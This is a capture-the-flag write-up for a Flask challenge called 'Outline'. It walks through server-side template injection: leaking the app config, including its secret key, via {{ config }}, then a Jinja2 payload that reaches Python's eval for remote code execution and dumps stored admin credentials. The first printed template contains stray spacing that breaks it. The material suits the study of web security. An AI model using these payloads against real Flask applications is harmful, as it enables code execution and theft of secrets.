# Outline (Task 1 & 2) (Flask SSTI)

Here is how I've solved the "Outline" challenge for Task 1 and 2 in LNC CTF 2022.

## Challenge description
Oh look its a vulnerable flask app! There are 2 flags hidden here. Good luck!

Task 1: Retrieve the flag from its configs  
`nc c2.lagncrash.com 8002`

Task 2: /flag seems to have an error... Try accessing as one of the other users!
`nc c2.lagncrash.com 8002`


## Solution & step-by-step walkthrough
Firstly, let us netcat into the server provided.  
```[spawner] Spinning up new instance of:
[spawner]     Outline
[spawner]
[spawner] Access your challenge at:
[spawner]     http://c2.lagncrash.com:12571/
[spawner]
[spawner] ------------------------- NOTE --------------------------
[spawner] Hit [Enter] to destroy your challenge instance once done!

```
The server has spawned a link for us to connect. Let us visit that link in our browser.

![image](https://user-images.githubusercontent.com/58442255/160234742-602fdaf6-1657-413c-8fc9-ef7142ec36ba.png)  
We're presented with a login screen. Register for an account by clicking the "Sign up!" button and login.

Once we've logged in, we see 4 text fields for us to enter information.

![image](https://user-images.githubusercontent.com/58442255/160234811-8816423f-9418-4782-a5a2-903c537f5b07.png)  
Since this is a flask server (presumably mainly written in Python?), we will test for Server-Side Template Injection(SSTI). 
Refer to this for more info: https://github.com/w181496/Web-CTF-Cheatsheet#ssti (or https://github-com.translate.goog/w181496/Web-CTF-Cheatsheet?_x_tr_sl=zh-CN&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp#ssti because parts of the link is in Chinese, but if you take CL as yr MT you should be able to read :)) and this https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection 
![image](https://user-images.githubusercontent.com/58442255/160234843-9bbe8480-a4ff-453d-8ad4-be19ca954989.png)
![image](https://user-images.githubusercontent.com/58442255/160234857-7babe2a8-3681-4468-9cbb-6889a9dfabb9.png)

We get this:
```
From: To: Subject: 7777777
```
It is apparent that the server (Flask) is vulnerable to SSTI.  


### Task 1
We can get the config of the server by typing in:
```
{{ config }}
```
We get this:
```
From: To: Subject: <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'LNC2022{s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```
Flag:
```
LNC2022{s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}
```


### Task 2
The challenge asks us to go to /flag.

When we visit `http://c2.lagncrash.com:<port here>/flag`, we get:
```
You are not allowed to view this page
```
Probably something to do with the current user.

 https://github.com/w181496/Web-CTF-Cheatsheet#ssti (or https://github-com.translate.goog/w181496/Web-CTF-Cheatsheet?_x_tr_sl=zh-CN&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp#ssti for translated version)
shows us that we can perform Python3 RCE.

From the link, we can perform Python RCE using this template
```python
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {%  for  b  in  c . __init__ . __globals__ . values ​​() % }
    {% if b.__class__ == {}.__class__ %}
      {% if 'eval' in b.keys() %}
        {{ b['eval']('<PYTHON CODE HERE>') }}
      {% endif %}
    {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```

Where shall we look though?
Let us look at the available local and global variables. 

A quick search of "get all variables in current scope python" returns this Stack Overflow post: https://stackoverflow.com/a/1041906/12204281

We can use this:
```python
dict(globals(), **locals())
```

Hence our SSTI template would be:
```python
    {% for c in [].__class__.__base__.__subclasses__() %}
      {% if c.__name__ == 'catch_warnings' %}
        {% for b in c.__init__.__globals__.values() %}
        {% if b.__class__ == {}.__class__ %}
          {% if 'eval' in b.keys() %}
            {{ b['eval']('dict(globals(), **locals())') }}
          {% endif %}
        {% endif %}
        {% endfor %}
      {% endif %}
    {% endfor %}
```
We get this:
![image](https://user-images.githubusercontent.com/58442255/160236072-fecc0c49-c0fa-4e7b-821a-fe8fd150374c.png)
You can see that at the bottom of the page there is some login credentials.  
Most notably, there is this set of credentials:
```python
'username': 'bigboiadmin', 'password': '2548dac1cb1bc28328c7f92cab9cf68ebf3d15a4514268a95f9b34619b456350'
```
Let us log out by reconnecting through netcat (like we did earlier).  
When we login with the supplied credentials, we get "Authentication failed".  
Perhaps the account isn't created? Let's go create an account with the above username and password.
![image](https://user-images.githubusercontent.com/58442255/160236223-f99ef853-ce47-4bcb-898c-bb4bd7217eef.png)

Once we're logged in, we can check the /flag page.  
![Screenshot from 2022-03-26 18-53-31](https://user-images.githubusercontent.com/58442255/160236284-16bd6d1c-7298-4516-a6e2-b8d14e594a46.png)

Flag:
```
LNC2022{n0t_4s_s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}
```

Thanks!
